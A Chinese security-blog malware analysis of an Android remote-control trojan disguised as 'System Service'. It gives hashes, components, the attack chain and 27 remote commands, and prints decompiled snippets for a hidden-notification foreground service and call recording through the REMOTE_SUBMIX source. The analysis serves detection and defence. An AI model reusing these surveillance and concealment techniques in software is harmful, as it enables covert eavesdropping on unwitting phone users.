---
title: 【木马分析】安卓远控木马-System Service：46 项权限、27 条远程命令，静默窃听偷拍钓鱼
url: https://mp.weixin.qq.com/s/5Q9v9nXK62Bhj66s7tRsBg
source: Doonsec's feed
date: 2026-09-23
fetch_date: 2026-09-24T07:04:01.074188
---

# 【木马分析】安卓远控木马-System Service：46 项权限、27 条远程命令，静默窃听偷拍钓鱼

# 【木马分析】安卓远控木马-System Service：46 项权限、27 条远程命令，静默窃听偷拍钓鱼

原创

金夏
金夏

金夏安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

36.46 KB 的恶意 APK，能远程拍照、录音、弹钓鱼页、操控屏幕，在贴吧、论坛上大批用户中招，很多VIVO跟小米的机主感到头疼。

![](https://mmbiz.qpic.cn/mmbiz_png/Iv8D5nD32icJP2jK1VmJL1fu2BsCzLbdjZRVp04ib7405bqY5oghRibM9wjxoR7rzeaf8leIdG09IAYKDsIjHRMRBaAkgiaguZZfSBib4DDq2WCQ/640?wx_fmt=png&from=appmsg)

## 1概述

这是一个伪装成系统服务的安卓远控木马，安装包只有 36.46 KB。它不依赖 root、不利用系统漏洞，全部通过 Android 官方合法机制实现持久化和窃密。没有桌面图标，靠开机广播和 ContentProvider 对外暴露能力。运行后静默获取麦克风、相机、短信、通讯录、位置等 25 项敏感权限，后台与 C2 保持通信，等待远程指令进行录音、偷拍、截屏、读取验证码。

我们在雷电模拟器（Android 14）里完整复现了安装、运行、权限获取全过程，并用金夏执盾扫描，样本库精确命中"System Service 远程监控木马"，定性为高危，风险评分 100 分。

| 维度 | 评估 |
| --- | --- |
| **影响平台** | Android 5.0（API 21）～ Android 14；雷电模拟器实测复现通过 |
| **主要危害** | 静默录音、后台偷拍、读取短信验证码、通讯录外泄、全屏钓鱼覆盖 |
| **传播方式** | 侧载安装，伪装成"系统服务更新"诱导手动授权 |
| **样本大小** | 37,333 字节，无 Native 库，Java 完全可读 |
| **包名** | `com.system.service` |
| **运行 UID** | 10071（u0\_a71），实测 PID 2109，后台休眠等 C2 指令 |
| **权限数量** | 请求 46 项，危险权限 25 项，已授予 11 项，拒绝 2 项 |

## 2样本特征

样本基本信息：
文件:   System\_Service\_com.system.service.apk
大小:   37333 bytes
MD5:   0271100A50D61C37936E4DD4F3F11560
SHA256: 77C9E047D508E94C213AA70D139CEDE2DD58D983DB7C02D969358D2F1FBC3EBB

样本基本信息：36.46 KB，MD5/SHA256 哈希值

### 2.1 基本信息

| 项目 | 值 |
| --- | --- |
| 文件大小 | 37,333 字节 |
| MD5 | `0271100A50D61C37936E4DD4F3F11560` |
| SHA-256 | `77c9e047d508e94c213aa70d139cede2dd58d983db7c02d969358d2f1fbc3ebb` |
| 包名 | `com.system.service` |
| 应用名 | System Service |
| minSdk / targetSdk | 21 / 28（targetSdk 28 是故意的，规避 Android 9 以上后台权限管控） |
| 签名 SHA-256 | `126503A2F1A9BA717AA0533D947D5463DE2D25BD61C2F03ECA0594DD050D0F76` |
| 加壳情况 | 无壳，Java 字节码完全可读 |

### 2.2 组件结构

| 组件类型 | 组件名 | 作用 |
| --- | --- | --- |
| Service | `BridgeService` | 前台服务，空标题通知栏隐藏，保活 |
| Receiver | `BootReceiver` | 监听开机广播，自启动 |
| Receiver | `BridgeDeviceAdmin` | 设备管理员激活，防卸载 |
| Provider | `BridgeProvider` | 对外暴露 `content://com.system.service.bridge` |
| Activity | `PhishActivity` | WebView 全屏加载钓鱼 HTML，锁屏下显示 |
| Activity | `BlackScreenActivity` | 黑屏覆盖，隐藏操作痕迹 |
| Helper | `AudioCaptureHelper` | 麦克风/系统内录，8000Hz PCM |
| Helper | `CameraCaptureHelper` | Camera2 后台偷拍，640x480，500ms/张 |
| Helper | `OverlayHelper` | 悬浮窗覆盖，钓鱼弹窗 |
| Helper | `BridgeA11ySupport` | 无障碍服务，读取屏幕内容 |

### 2.3 攻击链

阶段一：诱导安装

钓鱼渠道分发 APK，命名"系统服务更新"，诱导侧载。

阶段二：权限获取

申请设备管理员、悬浮窗、录音、相机、短信等 46 项权限，ADB 侧载时自动授予。

阶段三：静默运行

无桌面图标，开机自启，ContentProvider 唤起进程，后台休眠等 C2 指令。

阶段四：按需窃密

收到 C2 指令后录音、拍照、截屏、读短信、位置上报，或全屏覆盖钓鱼页面。

## 3静态代码分析

![jadx 反编译](https://mmbiz.qpic.cn/mmbiz_jpg/Iv8D5nD32icKHibfvvN2pv3AaDia6ibxQyXNQd8eKB5h2eyU5RqU59K4DQtkR2VibffK7l8YcCibc2raMSjbrAVx0Jyuo4HvFwNYh5yhXTD4dCicnY/640?wx_fmt=jpeg)

jadx-gui 1.5.6 加载样本：dex 内共 35 个类、187 个方法、7255 条指令；反编译输出为 13 个 Java 顶层类文件（其余为内部类/匿名类），核心是 BridgeProvider（628 行）和 CameraCaptureHelper（526 行）

![反编译类列表](https://mmbiz.qpic.cn/mmbiz_jpg/Iv8D5nD32icJZELgvWxoHAiahqiahAk1GNVBNMu3LtE8YLqZW6ZH2VBzKTLsR1eEG62yAQtG1Qg55OFkLYt4bEh6jcb265bzM10sIGfjlaHGos/640?wx_fmt=jpeg)

反编译输出：13个 Java 类文件，核心是 BridgeProvider（628行）和 CameraCaptureHelper（526行）

```
 System Service 木马信息：[1] 类文件统计：13 个 Java 类  - AudioCaptureHelper.java          6478 字节  - BlackScreenActivity.java         2369 字节  - BootReceiver.java                1259 字节  - BridgeA11ySupport.java           6230 字节  - BridgeDeviceAdmin.java            845 字节  - BridgeProvider.java             22997 字节  - BridgeService.java               1995 字节  - CameraCaptureHelper.java        25399 字节  - CameraProxyActivity.java         5328 字节  - OverlayHelper.java              12493 字节  - PhishActivity.java              10314 字节  - R.java                            306 字节  - Scheduler.java                   1540 字节[2] 危险 API 调用统计  Camera2             :  3 处 -> CameraManager, CameraDevice, CaptureRequest  AudioRecord         :  2 处 -> AudioRecord, AudioSource  WebView             :  3 处 -> WebView, WebSettings, loadUrl  Overlay             :  2 处 -> WindowManager, addView  SMS                 :  1 处 -> getContentResolver  Contacts            :  1 处 -> query  Boot                :  2 处 -> BOOT_COMPLETED, startForegroundService  Base64              :  2 处 -> Base64.decode, Base64.encodeToString  FileIO              :  2 处 -> FileOutputStream, FileInputStream[3] BridgeProvider 远程命令清单   1. stop_service   2. a11y_long_press   3. stream_start   4. a11y_tap   5. overlay_status   6. a11y_global   7. ping   8. phish_check   9. a11y_ping  10. start_service  11. overlay_hide  12. overlay_show  13. a11y_node_tap  14. audio_start  15. phish_hide  16. phish_poll  17. phish_launch  18. blackscreen_status  19. phish_result  20. blackscreen_hide  21. blackscreen_show  22. audio_poll  23. audio_stop  24. stream_stop  25. camera_capture  26. a11y_force_click  27. a11y_swipe  共 27 个命令[4] 脚本未匹配到其定义的敏感 API 特征[5] 关键常量配置  AUDIO_SOURCE_REMOTE_SUBMIX     = 8  CHANNEL_CONFIG                 = 16  CHUNK_MS                       = 100  ENCODING                       = 2  SAMPLE_RATE                    = 8000  TAG                            = "AudioCapture"  TAG                            = "BootReceiver"  A11Y_URI                       = "content://com.tikttok.a11y.provider"  TAG                            = "BridgeProvider"  TAG                            = "BridgeAdmin"  CAMERA_PROXY_POLL_MS           = 12000  CAMERA_PROXY_STEP_MS           = 200  PHISH_BRIDGE_VERSION           = 3  TAG                            = "BridgeProvider"  CHANNEL_ID                     = "bridge_service"  NOTIFICATION_ID                = 1  CAPTURE_TIMEOUT_MS             = 8000  HEIGHT                         = 480  STREAM_INTERVAL_MS             = 500  TAG                            = "CameraCapture"
```

自动识别远程命令关键词和关键常量

### 3.1 前台服务：通知栏完全隐藏

`BridgeService` 是保活核心。它把通知渠道设为静音、不显示角标、重要性最低，通知标题和内容全部为空。用户在通知栏根本看不到有这个服务在跑。

```
// BridgeService.javaprivate static final String CHANNEL_ID = "bridge_service";private void createChannel() {    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;    NotificationChannel ch = new NotificationChannel(            CHANNEL_ID,            "System",            NotificationManager.IMPORTANCE_LOW   // 关键：不能是 NONE，否则前台服务通知不显示    );    ch.setShowBadge(false);    ch.setSound(null, null);    ch.enableVibration(false);    ch.setLights(0, 0);    NotificationManager mgr = getSystemService(NotificationManager.class);    if (mgr != null) {        mgr.createNotificationChannel(ch);    }}private Notification buildNotification() {    Notification.Builder builder;    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {        builder = new Notification.Builder(this, CHANNEL_ID);    } else {        builder = new Notification.Builder(this);        builder.setPriority(Notification.PRIORITY_MIN);    }    return builder            .setContentTitle("")          // 前台服务通知建议给个非空标题            .setContentText("")            .setSmallIcon(android.R.drawable.ic_menu_info_details)            .setOngoing(true)            .setShowWhen(false)            .setCategory(Notification.CATEGORY_SERVICE)            .build();}
```

### 3.2 录音：麦克风 + 系统内录双通道

`AudioCaptureHelper` 支持两种录音源：`mic`（麦克风）和 `system`（系统内部音频，即通话录音）。采样率 8000Hz、单声道、16bit PCM，后台持续录音，C2 下发 `poll` 指令时拉取最新音频数据。

```
// AudioCaptureHelper.java// ===== 常量 =====private static final int AUDIO_SOURCE_REMOTE_SUBMIX = 8;   // 系统内录private static final int AUDIO_SOURCE_MIC             = 1;   // 麦克风private static final int SAMPLE_RATE     = 8000;private static final int CHANNEL_CONFIG  = 16;   // MONOprivate static final int ENCODING        = 2;    // PCM_16BIT// ===== 选择录音源：system=内录，否则麦克风 =====private static int resolveAudioSource(String src) {    return isSystemSource(src) ? AUDIO_SOURCE_REMOTE_SUBMIX : AUDIO_SOURCE_MIC;}// ===== 后台读循环，持续往 latestPcm 写 =====private void readLoop() {    while (recording.get()) {        byte[] pcm = readOnce();        if (pcm != null && pcm.length > 0) {            latestPcm = pcm;        }    }}
```

**关键点：**`AUDIO_SOURCE_REMOTE_SUBMIX=8` 是 Android 隐藏的系统内录源，能录到对方通话声音。配合麦克风，攻击者能完整录下通话双方的对话。

![AudioCaptureHelper.java 代码](http...